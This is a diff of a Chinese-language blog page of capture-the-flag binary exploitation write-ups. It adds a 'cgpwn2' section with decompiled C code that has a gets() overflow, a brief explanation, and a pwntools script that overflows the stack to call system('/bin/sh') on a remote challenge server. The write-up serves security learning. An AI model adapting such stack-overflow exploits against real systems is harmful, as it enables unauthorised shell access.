@@ -131,7 +131,7 @@
                   
                   &nbsp;<i class="far fa-chart-bar"></i>
                   <span class="post-count">
-                    919 字
+                    1.2k 字
                   </span>&nbsp;
                 
 
@@ -139,7 +139,7 @@
                   
                   &nbsp;<i class="far fa-clock"></i>
                   <span class="post-count">
-                      4 分钟
+                      6 分钟
                   </span>&nbsp;
                 
 
@@ -352,6 +352,70 @@ payload=&#39;a&#39;*0x14+&#39;a&#39;*4+p32(sys_addr)
 payload=payload.ljust(263,&#39;a&#39;)
 io.send(payload)
 io.recv()
+io.interactive()</code></pre>
+<h4 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h4><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  setbuf(stdin, 0);
+  setbuf(stdout, 0);
+  setbuf(stderr, 0);
+  hello();
+  puts(&quot;thank you&quot;);
+  return 0;
+}
+
+char *hello()
+{
+  char *v0; // eax
+  signed int v1; // ebx
+  unsigned int v2; // ecx
+  char *v3; // eax
+  char s; // [esp+12h] [ebp-26h]
+  int v6; // [esp+14h] [ebp-24h]
+
+  v0 = &amp;s;
+  v1 = 30;
+  if ( (unsigned int)&amp;s &amp; 2 )
+  {
+    *(_WORD *)&amp;s = 0;
+    v0 = (char *)&amp;v6;
+    v1 = 28;
+  }
+  v2 = 0;
+  do
+  {
+    *(_DWORD *)&amp;v0[v2] = 0;
+    v2 += 4;
+  }
+  while ( v2 &lt; (v1 &amp; 0xFFFFFFFC) );
+  v3 = &amp;v0[v2];
+  if ( v1 &amp; 2 )
+  {
+    *(_WORD *)v3 = 0;
+    v3 += 2;
+  }
+  if ( v1 &amp; 1 )
+    *v3 = 0;
+  puts(&quot;please tell me your name&quot;);
+  fgets(name, 50, stdin);
+  puts(&quot;hello,you can leave some message here:&quot;);
+  return gets(&amp;s);
+}
+
+int pwn()
+{
+  return system(&quot;echo hehehe&quot;);
+}</code></pre>
+<p>所有需要用到的函数都在这里，可以看到自带system函数，但是没有<code>/bin/sh</code>，所以需要手动构造，正好之前输入了一个<code>name</code>是一个全局变量，可以直接找到地址，以此构造ROP，exp如下：</p>
+<pre><code class="python">from pwn import *
+sh_addr=0x0804A080
+elf=ELF(&#39;./cgpwn2&#39;)
+sys_addr=elf.symbols[&#39;system&#39;]
+io=process(&#39;./cgpwn2&#39;)
+io=remote(&#39;111.198.29.45&#39;,52898)
+io.sendlineafter(&#39;please tell me your name&#39;,&#39;/bin/sh&#39;)
+io.recvuntil(&#39;hello,you can leave some message here:&#39;)
+payload=&#39;a&#39;*0x26+p32(0)+p32(sys_addr)+p32(0)+p32(sh_addr)
+io.sendline(payload)
 io.interactive()</code></pre>
 
             <hr>
